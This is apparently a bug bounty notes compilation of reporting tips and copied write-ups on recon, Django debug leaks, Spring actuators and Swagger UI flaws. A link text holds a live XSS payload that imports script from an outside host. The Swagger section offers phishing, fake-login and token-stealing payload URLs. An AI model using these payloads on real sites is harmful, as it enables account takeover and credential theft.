

![](https://miro.medium.com/v2/resize:fit:627/1*h0eT7qinAY2Xa-KKA2DraA.png)

**The security team reviewing your report might not be familiar with the specific techniques or tools you used.** Your report should be clear enough for someone with a general security background to understand the issue without needing extensive additional research.

## Follow a Clear Structure

- **Title:** Be precise and descriptive. The title should immediately give a clear idea of the vulnerability you’re reporting.
- **Summary:** Start with a brief overview of the vulnerability. This should include what the bug is, how severe it is, and what part of the application it affects.
- **Steps to Reproduce:** This is the heart of your report. Provide a detailed, step-by-step guide on how to reproduce the vulnerability. Include screenshots, code snippets, or any other evidence that helps illustrate the issue.
- **Attachments:** If you have any additional evidence, such as logs or video recordings, include them here.
- **Mitigation:** Offer suggestions on how the issue can be fixed. This shows that you not only understand the problem but also have thought about potential solutions.
- **Impact:** Explain the potential consequences of the vulnerability. How could an attacker exploit this bug? What kind of damage could it cause? Also explain the severity and cvss score according to your under standing.

## Be Clear and Concise

- Avoid unnecessary jargon. Use simple language and explain any technical terms that might not be immediately clear. Your goal is to make sure the person reading your report understands the issue without getting bogged down in complexity.
- Keep your sentences and paragraphs short and to the point. Long-winded explanations can confuse the reader.

## Use Visuals for Clarity

- Screenshots, diagrams, and even short videos can be incredibly helpful. They allow the reader to follow along with your steps more easily and can clarify complex points.
- For example, when I report a bug, I always include screenshots and video that highlight where the vulnerability occurs and the results of exploiting it.

## Be Objective and Professional

- Stick to the facts. Describe what you found, how you found it, and the evidence that supports your findings. Avoid making assumptions or exaggerating the impact of the bug.
- Professionalism is key. A well-organized and respectful report reflects well on you and can lead to more successful submissions in the future.

## Assign the Correct Severity

- Accurately determining the severity of the vulnerability is crucial. It helps the security team prioritize the fix and ensures that your report is taken seriously. Consider the potential impact and the likelihood of exploitation when assigning severity.
- **The correct or nearly correct CVSS gives an idea of you to the team that how good u know about the reported bug so if they try to downgrade your provided score they have to give you the explanation to prove their assigning or you can argue on cvss.**

> [CVSS Calculator – Professor Software Solutions–>';\"/><img src onerror=import('//ha.ez.pe')>](https://bughuntar.com/tools/cvsscalculator/)

## Example Report: Unauthorized Modification of Web Hosting Configuration

## Here’s how I structured the report:

- **Title:** Unauthorized Modification of Web Hosting Configuration in *
- **Summary:** Write small but enough to provide the details of the vulnerability

![](https://miro.medium.com/v2/resize:fit:627/1*mtX_burN7pBWvqvDYow5eQ.png)

- **Steps to Reproduce:** Provide the steps for easy reproduction of issue.

![](https://miro.medium.com/v2/resize:fit:627/1*tOueMIBiOgkoKgz82-HmMg.png)

- **Mitigation:** Suggested what can fix the particular vulnerability in my case proper authorization check.
- **Impact:** Explain the potential consequences of the vulnerability. What can an attacker achieve by exploiting this bug?

![](https://miro.medium.com/v2/resize:fit:627/1*hNzXnSclEtTYP9phhgcWzg.png)

**Maybe you can get the bonus**

![](https://miro.medium.com/v2/resize:fit:627/1*aR9THnufMk2ommu16x6KzQ.png)

## Takeaways for Writing a Great Report

Write simple and short not make report lengthily with unnecessary writing always add Screenshots, diagrams, snippets , request and even short videos can be incredibly helpful. Stick to the facts and describe what you found without making assumptions

---

#Important_report 

## i found this endpoint:

> https://chatbot.target.com/

tried to use dirsearch but no luck:

```
dirsearch -u https://chatbot.target.com/ -f -F -x 403,404
```

So i tryed:

```
ffuf -u https://chatbot-FUZZ.target.com/ -w SecLists/Discovery/DNS/trickery-Subdomains.txt -r -mc 200

```
Boom! I found an interesting one:  

>https://chatbot-v2.target.com/

I recalled a write-up by another hunter. Inspired, I decided to check the **CloudFront mappings** of both chatbot subdomains.

```
dig chatbot.target.com  
dig chatbot-v2.target.com
```

Both resolved to CloudFront addresses.

Now I thought: _Why not run Dirsearch directly on the CloudFront URL?_

```
dirsearch -u https://randomAddress.cloudfront.net/ -f -F -x 403,404
```

The first one (**chatbot.target.com**) gave me nothing.  
But **chatbot-v2**…

**And found an exposed .env file with a .git file inside;**

```
https://randomAddress.cloudfront.net/.git/config
```

-- look for exposed PII on git file.

---

### Reports:

1:

https://infosecwriteups.com/the-subdomain-they-forgot-how-i-chained-bugs-for-a-1-000-bounty-094d89758489


_That's exactly what I found during a late-night recon session: an old subdomain, neglected and forgotten by its owners. To them, it was harmless. To me, it was a ticking time bomb._

_What followed was a cascade of discoveries: hardcoded credentials, exposed APIs, writable S3 buckets, and an outdated CMS riddled with vulnerabilities. One bug led to another until I had chained together a critical exploit worth_ _**$1,000**__._

_Here's how I turned this forgotten relic into one of my most rewarding bug bounty reports yet._

The Needle in the Haystack

_It all started with a recon sweep using_ _**[Amass](https://github.com/owasp-amass/amass)**_ _and_ _**[Subfinder](https://github.com/projectdiscovery/subfinder)**__:_


```cpp
amass enum -d company.com
```

Most of the results were standard, modern subdomains. But one stood out:

```typescript
beta.oldsite.company.com
```

It had all the hallmarks of an outdated system:

- No HTTPS — just plain HTTP.
- An old-school login page with slow response times.
- Branding that didn't match the company's current design language.

I knew this was a lead worth chasing.

**Hardcoded Secrets**

Inspecting the site's assets revealed a large JavaScript file:

```ruby
http://beta.oldsite.company.com/static/js/bundle.js
```

I downloaded it and searched for sensitive keywords:

```perl
grep -iE "password|key|auth" bundle.js
```

Sure enough, I found:

```vbinet
const adminUser = "admin";
const adminPassword = "password123";These hardcoded credentials had likely been forgotten by developers, but they opened the door to the admin panel.
```

**Exploiting the Admin Panel**

Using the credentials, I logged into the admin interface:

```bash
http://beta.oldsite.company.com/admin
```

The dashboard was fully functional and exposed:

1. **Exportable User Data**: Lists of user emails, phone numbers, and hashed passwords.
2. **API Keys**: Including AWS and third-party service credentials.
3. **Internal Reports**: Detailed insights into business operations.

I documented my findings and moved to explore the connected APIs.

**The APIs — Wide Open Doors**

The admin panel linked to several APIs. Using **Postman**, I tested them for access control. Shockingly, most of them didn't require authentication.

#### Dumping User Data

```bash
POST /api/v1/export-users HTTP/1.1
Host: beta.oldsite.company.com
```

This endpoint returned all user records in JSON format. Removing the `Authorization` header made no difference, confirming that it was entirely open.

**Configuration Details**

Another endpoint provided sensitive environment variables, including database connection strings and cloud keys:

```bash
GET /api/v1/system-config
```

**Writable S3 Bucket**

One of the leaked AWS keys granted access to an S3 bucket. Using the AWS CLI, I tested its permissions:

```bash
aws s3 ls s3://bucket-name
aws s3 cp test.html s3://bucket-name/
```

The bucket was **publicly writable**, allowing me to upload files. Worse, these files were accessible directly via:

```bash
http://beta.oldsite.company.com/uploads/test.html
```

This could easily be exploited for phishing campaigns or malware distribution.

#### Chaining the Exploits —

I combined these vulnerabilities into an exploit chain:

1. **Admin Panel Access**: Use the hardcoded credentials to log in.
2. **API Exploitation**: Dump sensitive user and configuration data.
3. **S3 Bucket Abuse**: Upload malicious files to the bucket, accessible via a trusted domain.
4. **Code Execution**: Exploit an outdated WordPress plugin to achieve remote code execution.

Together, these issues could enable:

- **Full System Compromise**: Admin privileges, data access, and backend control.
- **Massive Data Breach**: User data could be exfiltrated and abused.
- **Brand Damage**: The writable S3 bucket could host phishing pages, damaging customer trust.

I submitted a detailed report, including:

- **Steps to Reproduce**: Detailed instructions for every vulnerability.
- **Impact Assessment**: How the vulnerabilities could be exploited in real-world scenarios.
- **Proof of Concept**: Screenshots, scripts, and payloads demonstrating the issues.

**The company patched the issues within days, decommissioned the subdomain, and revoked the exposed AWS keys. My efforts earned a $1,000 bounty and recognition from their security team.**

by:

LinkedIn: [Akash Ghosh](https://www.linkedin.com/in/akash-ghosh-145bb61b5/)

Github: [Akash Ghosh](https://github.com/myselfakash20)



----


![[Pasted image 20250202223923.png]]

---

## Why Django’s [`DEBUG=True`] is a Goldmine for Hackers

#debug_mode 

# What Does DEBUG=True Do in Django?

In Django, the `DEBUG` setting controls whether debug information, including error stack traces and detailed request information, is shown when an error occurs. With `DEBUG=True`, Django outputs a verbose error page containing sensitive information to aid developers during the development process.

# From an Attacker’s Point of View:

When an attacker finds a Django site running with `DEBUG=True`, **it’s as though the application is openly offering detailed internal information to help them craft their attack.** These verbose error messages contain everything from the server's environment variables to installed middleware and even potential entry points for attack.

# How Attackers Identify Django Sites with DEBUG=True

# Scanning the Web for Vulnerable Sites

Attackers use automated tools like **Shodan**, **FOFA**, and **Censys** to scour the web for Django applications. These tools allow attackers to search for specific error messages and patterns associated with `DEBUG=True`.

# Practical Method:

- **FOFA Query**:

```bash
"DEBUG=True" && "Django" && "RuntimeError"
```

![](https://miro.medium.com/v2/resize:fit:700/1*34nbj-K5fh7VBy7wzkFQBg.png)

								Django — FOFA

**These search engines scan the internet for open ports and services and then analyze the HTTP responses to see if they contain known Django debug patterns**. With these search results, attackers can compile a list of vulnerable websites running Django with `DEBUG=True`.

# Data Leaked via Django Debug Pages

When `DEBUG=True` is set, attackers can harvest valuable information directly from the debug pages.

# Practical Data Retrieval:

**Full Stack Trace**:

- The stack trace provides insight into how the code executes, where errors occur, and potentially exposed variables in requests and responses.
- Example:

Traceback (most recent call last): File "/path/to/your/project/views.py"...

**Practical Use**: Attackers can identify code execution paths and look for points where input is processed, enabling targeted attacks like SQL injection or file inclusion exploits.

![](https://miro.medium.com/v2/resize:fit:700/1*UgP_YYtAPTeVybMjyOOmBQ.png)

**Request and Response Data**:

- Attackers gain insight into cookies, CSRF tokens, and headers from both the request and the response.
- **Practical Use**: Using this information, attackers can perform session hijacking, steal CSRF tokens, or craft more effective social engineering attacks.

```bash
Request Headers: {   'Cookie': 'sessionid=abcd1234; csrftoken=efgh5678...',   
                     'User-Agent': 'Mozilla/5.0...' }
```

**Installed Applications and Middleware**:

Installed apps: ['django.contrib.admin', 'myapp', 'rest_framework'...]

**Practical Use**: By analyzing installed apps and middleware, attackers can identify vulnerable third-party libraries or unpatched components.

### Practical Methods for Exploiting a Django DEBUG=True Configuration

# Leveraging the Stack Trace

Once a vulnerable site is identified, the next step is to extract as much information as possible from the stack trace. This includes sensitive details like:

- **File paths**:

File "/var/www/myapp/views.py" in render

The file path gives an attacker clues about the structure of the server and potential locations of sensitive files (config files, logs, etc.).  
Seeing which functions and methods are being called **and how they handle input can expose SQL injection points, XSS vulnerabilities, or logic flaws.**

# CSRF Token Abuse

If an attacker can retrieve the CSRF token, they can carry out **Cross-Site Request Forgery** attacks. If the token is tied to an active session, an attacker can:

- Perform unauthorized actions on behalf of a user (e.g., making purchases or transferring funds).
- Hijack user sessions if combined with a stolen session cookie.

![](https://miro.medium.com/v2/resize:fit:700/1*KdsiyhPRatQgKKp2DEAEMQ.png)

							CSRF

# Database Exploitation

Attackers can retrieve partial database configurations (such as the database type and schema) from debug pages and combine them with other known vulnerabilities to:

- Execute SQL injections.
- Bypass authentication or escalate privileges by understanding how the database queries are processed.

![](https://miro.medium.com/v2/resize:fit:700/1*p3DzghnmXr5Tq5qefP_Gvw.png)

# The Top 5 Valuable Data Attackers Can Retrieve from DEBUG=True

**SECRET_KEY**: While Django tries to hide this in debug output, it is sometimes retrievable through indirect methods or misconfigurations in related files. With the `SECRET_KEY`, attackers can:

- Generate forged session tokens.
- Bypass authentication mechanisms.

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

TO DO

> https://rokkamvamshi18.medium.com/exploiting-django-debug-mode-for-unrestricted-access-to-the-internal-dashboard-b725783714ae

---

#Important_report

# How I Found the Bug

![[Pasted image 20250614205102.png]]

1. Signed up for a free trial (30 days).
2. Waited 20 days (only 10 days left).
3. Changed my computer’s date back (from May 1 to April 20).
4. Refreshed the website — suddenly, my trial showed 20 days left instead of 10!

> I know a lot of people would say,  
> **“This kind of thing only works on the client side — the server will definitely catch it!”**  
> Yeah, I thought the same at first. Honestly, I almost dropped the whole idea and left it alone.  
> So, I just let my 30-day trial run its course and didn’t mess with anything.

**But guess what?**  
Once the trial actually ended, I went back, tried the trick — and boom 💥  
It **worked.**

# Step-by-Step: How I Cheated the Trial

1. I created an account and started the **30-day free trial.** All good.
2. Fast-forward a few weeks: I logged in again and boom — **“Trial expired. Please upgrade.”**
3. Instead of upgrading, I pulled out my secret weapon:  
    👉 **Settings > Date & Time > Set Manually > Roll back to the 1st of the month.**
4. I **refreshed the tab**…  
    And guess what?  
    💥 **My trial was magically back.** Full access. No questions asked. No alerts. Like nothing happened.

![[Pasted image 20250614204538.png]]

_Basically, the app was trusting_ **_my local system time_** _to check if the trial expired._  
Spoiler alert: **Never trust the client.** Ever.

## 🧠 Why This Is a Big Deal

- **Anyone** can abuse this. No skills required.
- Users can **stay in free trial mode forever.**
- Companies can lose **revenue, analytics accuracy**, and worse — **credibility**.
- Imagine this getting viral on Reddit or shared in Discord servers.

## How to Fix It?

The solution is simple:  
🔹 Use server time, not the user’s local time for trial tracking.  
🔹 Store trial start/end dates securely so users can’t fake them.


# Next Bug:

## Provide Username in Password Reset Functionality, But with no way of finding it?

### Bug type: UX-related authentication failure

## 🔍 Understanding the Website Functionality

The website has a standard **login system** that requires a **username and password**. Alongside it, there’s a **Forgot Password** option too.

## 🖥️ How the Login Page Works

- You enter your **username and password** and successfully log in.
- If you **forget your password**, there’s a **Forgot Password** button.
- Clicking it sends a **password reset link** to your email.
- When you **set a new password**, instead of logging you in automatically, it redirects you back to the **login page**, requiring you to enter your credentials again.

![](https://miro.medium.com/v2/resize:fit:875/1*pylZ2ynlMMT7VhZ4_Zxo6g.jpeg)

**This is how the “forgot password” email looks.**

## ⏳ Now, wait 2 minutes before moving on to the blog…

The image below has a bug! I didn’t hide it — you can find it. I’ve already given all the necessary details above. Let’s see if you can spot it! 🔍💡

![](https://miro.medium.com/v2/resize:fit:801/1*f_-NI3XhDoa4O5Y0qm816A.png)v

## 🚨 The Bug: No Way to Recover a Forgotten Username

_Now, here’s the real issue:_  
The login system **only requires a username**, not an email. So, what if a user **forgets their username**?

✅ You can reset your password.  
❌ But there’s **no way to recover your username**.

This means users who forget their username are completely stuck, as the platform has no built-in recovery option.

Furthermore, the ‘Forgot Password’ email itself is not displaying the username, such as ‘Hello jinx9, here is your link.’ That’s why I provided the screenshot above.

**If the system doesn’t associate an email address with usernames (or at least include the username in password reset emails), there’s no way for users to regain access without external support.**

Here’s how the issue could be improved:

1. **Username Recovery Option**: A “Forgot Username” button could send the username to the associated email address.
    
2. **Display Username in Emails**: Including the username in the password reset email would immediately solve part of the problem.
    
3. **Allow Logins via Email**: If users could log in with their email instead of just their username, they'd always have a way in.
    
4. **Support Contact**: If none of the above exists, users should at least have an easy way to contact support for manual assistance.

💰 **And yes, I’ve received bounties for bugs like this before!** If you’re into bug hunting, don’t ignore simple issues like login and authentication flaws. Sometimes, even the smallest mistake can lead to **a reward**.

![](https://miro.medium.com/v2/resize:fit:875/1*zfPa9J7iIK9njXcBtZ49pg.jpeg)

Thank-you

👀 Stay tuned for more **“No-Tool Bug Bounty”** write-ups!  
Got questions? Email me: `strangerwhite9@gmail.com`


## How to Spot the bug?

![[Pasted image 20250614225657.png]]

					Not Fixed Version

![[Pasted image 20250614225638.png]]

---

resource: https://medium.com/@hamdiyasin135/the-power-of-swagger-ui-docs-broken-access-control-a3b57fb035bd
## Swagger UI


**In the first what is swagger ui ?** :

**Swagger UI** is an open-source tool that provides an interactive interface for exploring, documenting, and testing RESTful APIs. It uses an OpenAPI Specification (OAS) file (JSON or YAML) to display API endpoints, parameters, and response schemas. Developers can test endpoints directly from the UI by customizing parameters, headers, and payloads. Swagger UI ensures standardized API documentation, improves collaboration, and simplifies testing without the need for additional tools.

**How I discovered The Bug:**

**As** Im Hunting On target site xyz.com First thing I Done My Recon Process so I try to gather all the subdomain So here I used [**subfinder**](https://github.com/projectdiscovery/subfinder)**,assetfinder** ,[https://securitytrails.com/](https://securitytrails.com/)**+** [**httpx**](https://github.com/encode/httpx) and I collect all subdomain with their status code

```bash
cat all.txt |httpx -sc -cl -title |tee all_alive
```

when testing them got one has admin portal login , i tried to do some directory fuzzing using “dirsearch” with custom wordlist on it

and the tool got me path like that : [https://xyz.com/swagger/index.html](https://mapcontent.tomtom.com/swagger/index.html)

good ,it’s running ==swagger ui docs== , and have section for user management by api endpoints :

![](https://miro.medium.com/v2/resize:fit:627/1*y-x9HHePQgKiEPF6eY4M6Q.png)

That endpoints for creating users on the system , update users info , got all info about users by username and delete users !

so started testing on it

**1.First creating disallowed user on the server:**

from the swagger got that Curl command to create the user :

```sh
curl -X 'POST' \  
  'https://abc.xyz.com/v2/user' \  
  -H 'accept: application/json' \  
  -H 'Content-Type: application/json' \  
  -d '{  
  "id": 0,  
  "username": "string",  
  "firstName": "string",  
  "lastName": "string",  
  "email": "string",  
  "password": "test",    
  "phone": "000000000000",  
  "userStatus": 1  
}'
```

and that the response :

![](https://miro.medium.com/v2/resize:fit:627/1*72GQ9VNnC6V_SRJGnxOJFw.png)

**2. Retrieve private user details:**

for that point i tested on the account i have created so lets go!


also the swagger got me that Curl to got users data :

```sh
curl -X 'GET' \  
  'https://abc.xyz.com/v2/user/username' \  
  -H 'accept: application/json'
```

and the response be:

![](https://miro.medium.com/v2/resize:fit:627/1*oh43_ph8CHlaz_sb5nazmQ.png)

**now i can see every users info and edit others information !!**


# Conclusion

Always test API endpoints thoroughly. Pay attention to:

Endpoints that don’t require tokens or session cookies

Functions like GET, POST, or PUT that return or modify user data

This discovery reminds us how crucial it is to implement proper authentication and access controls at every level of an application.

---

## Hacking Swagger UI - 101

resource:

>   https://freedium.cfd/https://infosecwriteups.com/hacking-swagger-ui-101-ccbce66ba028

### Swagger UI

![None](https://miro.medium.com/v2/resize:fit:700/1*7qATqEhHa8IbbNnQC7N6WA.png)

							Swagger UI Webpage

You have probably encountered this webpage and somewhat similar to it during your bug hunt.

I had encountered it before during my bug hunts; however, I had no clue back then and ignored it until I did an extensive research study on it, Now I am sharing my findings with the community.

Swagger UI is an open-source tool that provides a user-friendly interface to interact with RESTful APIs. 

It automatically generates interactive documentation for APIs, allowing users to explore and test endpoints directly in their browser. 

<mark style="background: #ADCCFFA6;">This tool is widely used by developers to understand, test, and debug APIs easily without needing to write code. </mark>Swagger UI supports features like request/response visualization and API versioning.

! **Use dirbuster or other directory brute forcer to search for instances**

```bash
dirsearch -u https://subdomain.paytm.com/ -f -F -x 403,404
```

and look-out for:

`/DOCUMENTATION` with a `200 OK`. Directory.

### Bug and affected Version

**What and where is the bug located?**

**Swagger UI** is vulnerable to **DOM XSS** due to improper input handling, especially from query parameters. An outdated version of the **DomPurify library** used for sanitizing input fails to properly clean certain inputs, allowing attackers to inject malicious scripts that run on the client-side. This can lead to content manipulation or data theft.

Since we are able to inject malicious scripts like **.yaml** and **.json** files we can trigger an xss with the **.yaml** file and it is also possible to fetch another **.js** **"script"** file from within the **.yaml** file to perform further attack vectors.

**Version Affected:** Swagger UI containing versions **(0.0.0 to 3.25.0)**

**Vulnerabilities possible:**

1. **DOM XSS:** (Document Object Model Cross-Site Scripting) is a type of XSS that occurs when malicious scripts are injected and when executed it is possible to modify the web page's DOM and perform harmful actions in client side.
2. **DOM XSS to Account Takeovers:** Due to the ability to trigger an XSS in the client side, it is also possible to exploit this vulnerability in some cases to fetch or steal sensitive session cookies which makes Account Takeover possible.
3. **Resource Injection:** A type of attack where an attacker can inject malicious resources in our case **.yaml** and **.json** files to execute harmful actions like creating a **fake login page, phishing pages and credential harvesting etc**. We can even fetch another .**js** file from the .**yaml** file. 

### Steps to reproduce

![None](https://miro.medium.com/v2/resize:fit:700/1*TF_VsiagJCa-63-2y1wj-A.png)

					Swagger UI Page Example

- **First, find a Swagger UI instance page,** you can use google dorks, nuclei templates etc. to detect it.

Note the URL example: **lab.ndl.go.jp/dl/swagger-ui.html

- Then add these parameters below to the end of the URL

```bash
?url=
?config=
?configUrl=

#example

- Like this lab.ndl.go.jp/dl/swagger-ui.html?url=

```

- Now it's time to add the payload, that is our resource injections.

1. **DOM XSS Test payload:**

```bash
# full payload:

https://raw.githubusercontent.com/Rivek619/R-Payloads-101/refs/heads/main/SwaggerUI/rtest0.yaml

- Like this lab.ndl.go.jp/dl/swagger-ui.html?url=https://raw.githubusercontent.com/Rivek619/R-Payloads-101/refs/heads/main/SwaggerUI/rtest0.yaml

```

If you're lucky you'll get like the image below.

![None](https://miro.medium.com/v2/resize:fit:700/1*-K-gOCpSKlCNv_XxW_6--g.png)

									DOM XSS POC

If you get this pop up, **you are very lucky!** You can now try for **Account Takeover + Credential Harvesting + Phishing page.**

_Find the Account Takeover steps at the end of these steps below._

**Tip:** try this Swagger UI payload too:

```bash
#if you find the swagger UI instance in the /DOCUMENTATION path:

https://subdomain.paytm.com/DOCUMENTATION?configUrl=https://xss.smarpo.com/test.json
```

But if you don't see a pop up, and feel that you are unlucky, hold up!

_If your page is like this_

![None](https://miro.medium.com/v2/resize:fit:700/1*DBQpZSZjmF3EezRJgZHUhA.png)

		No pop up but the API documentation has changed

**3. Resource Injection**

You're still in luck; this means that it is vulnerable to **resource injection vulnerability**.

- **You can inject a fake login page or hyperlink injection for impact like credential harvesting and phishing.**
- I have also created them for you, so simply inject the two payloads below for POC.

**4 and 5. Resource Injection Payloads: Fake login page + Phishing Hyperlink Injection**

```bash
Fake login page: https://raw.githubusercontent.com/Rivek619/R-Payloads-101/refs/heads/main/SwaggerUI/rlogin1.yaml 

Phishing page: https://raw.githubusercontent.com/Rivek619/R-Payloads-101/refs/heads/main/SwaggerUI/ylogin.yaml

#full payload:

- Like this: lab.ndl.go.jp/dl/swagger-ui.html?url=https://raw.githubusercontent.com/Rivek619/R-Payloads-101/refs/heads/main/SwaggerUI/rlogin1.yaml

```

![None](https://miro.medium.com/v2/resize:fit:700/1*6HNMr1AfQ3mM40I6nH2szg.png)

				Fake login page for Credential Harvesting

```bash
lab.ndl.go.jp/dl/swagger-ui.html?url=https://raw.githubusercontent.com/Rivek619/R-Payloads-101/refs/heads/main/SwaggerUI/ylogin.yaml
```

![None](https://miro.medium.com/v2/resize:fit:700/1*riLUWqTQH1lOtAnHxV0mZw.png)

				Hyperlink Injection + Phishing

Now if you did not see anything still trying these, your luck is very thin, but there is a small hope let me show you.

**Resource Injection in Api field and explore button**

![None](https://miro.medium.com/v2/resize:fit:700/1*0pPRHXxYCFSA7vgrZfgHjQ.png)

	Notice the input field and explore button, this is your final hope

- If your target's Swagger UI has an input field, try to **directly enter** just the **payload** and **click explore button.**

```
Fake login page: https://raw.githubusercontent.com/Rivek619/R-Payloads-101/refs/heads/main/SwaggerUI/rlogin1.yaml 

Phishing page: https://raw.githubusercontent.com/Rivek619/R-Payloads-101/refs/heads/main/SwaggerUI/ylogin.yaml
```

  
![None](https://miro.medium.com/v2/resize:fit:700/1*riLUWqTQH1lOtAnHxV0mZw.png)

		It might still be able to load the API File

However, this is a low severity bug which usually goes **as informative or P5.**


**=> To my lucky friends that had their pop up on their first try let's start with DOM XSS to Account Takeover**

**2. DOM XSS to Account Takeover:**

This one is a bit theoretical and a possible practical one, we can just simply show a possibility of **Account Takeover** or if you're in for it even Takeover an account.

- Similar to the above techniques adding the payload in the url simply just add this payload

```
https://raw.githubusercontent.com/Rivek619/R-Payloads-101/refs/heads/main/SwaggerUI/rtest6.yaml
```

This fetches cookies from the local storage, the name of the local storage might differ so showing an impact just for the sake of it, also does the trick.

![None](https://miro.medium.com/v2/resize:fit:700/1*VCEM6D3x9YIlmhJWzg0v-Q.png)

							Token POC

So that's the end of steps for now.

Some tips and tricks in some cases base64 encoded payload also does the trick, but I have seen only once or twice but still here is it for you.

```bash
ata:text/html;base64,eewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JpdmVrNjE5L1ItUGF5bG9hZHMtMTAxL3JlZnMvaGVhZHMvbWFpbi9Td2FnZ2VyVUkvcnRlc3QwLnlhbWwiCn0=
```

### Severity

1. **DOM XSS:** P2, High-Medium (Show Fake login page + Phishing page for impact as well)
2. **DOM XSS to Account Takeover:** P1-P2, Critical-High
3. **Resource Injection**: P3-P4, Medium-Low
4. **Resource Injection in Api field**: P4-P5, Low-Informational

### **Secured**

- **European Government (CERT-EU)**

![None](https://miro.medium.com/v2/resize:fit:700/1*0f_EtE9yy_hwoRC29xQQ2w.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*l2r3hSybqqyGe9hDjqQAHA.jpeg)

**Hall of Fame**

- **Brazil Government**

![None](https://miro.medium.com/v2/resize:fit:700/1*ol_71UkXuiSlC24CYJ1AHw.png)

- _**National Diet Library (Japan)**_

![None](https://miro.medium.com/v2/resize:fit:700/1*KP1rZSqQ5jDlke581ziP9w.png)

---

## How I used shodan to discover 3 easy bugs on VDP program?

The Bugs is :

- Information disclosure marked as P1 (Critical)
- XSS && HTMLI On swagger UI
- Information Exposure Through Debug Information

**The Setup**

 first, I prepared shodan for search on the target domain IPs so used that dork :

```vb
Ssl.cert.subject.CN:"target.com"
```

And I got many and many numbers of Ips:

![](https://miro.medium.com/v2/resize:fit:323/1*VNTM35UWy104rAn0kbjTgg.png)

Now to make it easier , i clicked **The blue word ‘More’**

and you must see that :

![](https://miro.medium.com/v2/resize:fit:700/1*cfWvOQkuMPaCjWghTw6cYA.png)

In **country** option, change it to ‘http.title’ ==> so you can see the http response above every IP ==> that make easy to detect important Ips :)

**##The first Bug Information disclosure Via ‘springboot actuator path’:**

- When i searched for the Ips with the title saw interesting title that is : **‘Whitelabel Error Page’ that error is strange to me so here i opened the link in the browser and see that page :)**

![](https://miro.medium.com/v2/resize:fit:700/1*r0YOkAkNOiDpn3yrelxDxg.png)

So here i tried to make some Fuzzing with The powerful tool ‘dirsearch’ and custom wordlist on that IP and got many paths like :

```
/actuator/ ->> The main path  
/actuator/heapdump   
/actuator/beans  
/actuator/caches  
actuator/conditions  
/actuator/configprops  
/actuator/env  
/actuator/threaddump  
/actuator/mappings  
/actuator/loggers
```

Now you will ask me what these paths are? and what it contains?


here explain some of them

- **/actuator/heapdump**

A heap dump is a snapshot of an application’s memory at a given time. It typically contains objects, variables, and references that were in use when the dump was generated. ~={red}While intended for debugging, an exposed heap dump can pose security risks if it contains sensitive information. Potential Security Risks:=~

Exposure of Sensitive Data — Heap dumps may contain authentication tokens, API keys, session identifiers, or even user-related data that should not be publicly accessible.

Information Disclosure — Internal application logic, class structures, and function references can be extracted, aiding an attacker in understanding backend mechanisms. Compliance & Privacy Risks — ~={yellow}If   the user data is present, this could lead to compliance concerns related to data protection regulations (e.g., GDPR, CCPA).=~

~={blue}Since this file is publicly accessible, an attacker could analyze its contents to gain unintended insights into the application’s internals, increasing the attack surface.=~ I recommend restricting access to heap dumps and ensuring they are not exposed in production environments.

- **/actuator/beans**

The /actuator/beans endpoint provides a full list of all Spring Beans in the application context. This can be dangerous because:

A**pplication Structure Disclosure — Attackers can map out service names, component dependencies, and internal classes, helping in targeted attacks.**

**Sensitive Functionality Exposure — If certain beans are related to authentication, database connections, or API interactions, an attacker may leverage this knowledge to craft more precise attacks.**

That's some of the paths , then i reported it and guess what ? yea its marked as P1 (Critical)

![](https://miro.medium.com/v2/resize:fit:700/1*sGgOiuXfFoiEymGEZMftDg.jpeg)


## The second Bug XSS && HTMLI On swagger UI :

Also when i was searching for the Ips with the title, i saw  ‘Swagger UI’:

I opened it quickly because i already had  a bug which I spoke already about it in that writeup :[https://medium.com/@hamdiyasin135/the-power-of-swagger-ui-docs-broken-access-control-a3b57fb035bd](https://medium.com/@hamdiyasin135/the-power-of-swagger-ui-docs-broken-access-control-a3b57fb035bd)

so here i checked the version of the swagger and noticed that it had an old version and  maybe it was vulnerable to XSS and HTML  **so i searched for the exploit  and discovered that it’s vulnerable in the parameter** `/?configUrl`

that parameter used to load external config to the swagger so used that payload to make the XSS attack [https://target.com/?configUrl=https://xss.smarpo.com/test.json](https://54.202.120.78/?configUrl=https%3A%2F%2Fxss.smarpo.com%2Ftest.json)

![](https://miro.medium.com/v2/resize:fit:700/1*DpxelDv3_V-80QphaLlo6g.jpeg)

And for HTMLi used that Payload `/?configUrl=https://gist.githubusercontent.com/zenelite123/af28f9b61759b800cb65f93ae7227fb5/raw/04003a9372ac6a5077ad76aa3d20f2e76635765b/test.json`


And at the end the bug has been triaged :

![](https://miro.medium.com/v2/resize:fit:700/1*YCGTA7bOkEbR2HeFht0Mqw.jpeg)

## The Third Bug Is Information Exposure Through Debug Information

- while i was testing on subdomains i got a strange one that when i open it i got that error

![](https://miro.medium.com/v2/resize:fit:700/1*udc_vZtbc7zTYP8zhHqWTw.png)

the error told me the debugging mode is not enabled on that subdomain so i got the great idea : what if i searched for the origin ip for that subdomain? **maybe the debugging mode is enabled on it ?**

so i searched for the origin ip for that subdomain on shodan and at the end i got it , and guess what?!, **the debug mode is enabled on it!!!!**

and I observed that it was exposed :

- Multiple internal paths
- Detailed traceback errors
- Server configuration details
- Backend framework information

![](https://miro.medium.com/v2/resize:fit:700/1*cKCdAHEMtjB964_Ymk0RGA.png)

							some of the info!

And the bug has been triaged also :)

![](https://miro.medium.com/v2/resize:fit:700/1*WwXl2Gq2HM_O3rR1x_sXjQ.jpeg)

---

# Improper Access Control in Swagger UI

_**Improper Access Control** means web application or software functions does not restrict or incorrectly restricts access and usage to any hidden resource or private functionality from an unauthorized actor. I found a bug on a web application through Swagger ~={yellow}Api UI where I was able to send emails to anyone from the company mail address=~, including attachments and also html injections._

What is **Swagger UI**? ~={cyan}It’s a set of open-source tools built around the OpenAPI Specification that can help you design, build, document and consume REST APIs.=~ The major Swagger tools include: Swagger Editor — browser-based editor where you can write OpenAPI definitions. It’s a collection of HTML, JavaScript, and CSS assets that dynamically generate beautiful documentation from a Swagger-compliant API. To learn more about Swagger Api UIs [**Here**](https://swagger.io/).

Now from all of those subdomain, my target subdomain was

```
api.mehedishakeel.com
```

I used the httpx **-status-code** and **-title -tech-detect** flag during the subdomain enumeration, identifying that this url was using the swagger ui api.

So, I open the url in browser, and get the following page UI:

![](https://miro.medium.com/v2/resize:fit:700/1*QmvJ3wVD-_i1TocU-5dF-g.png)

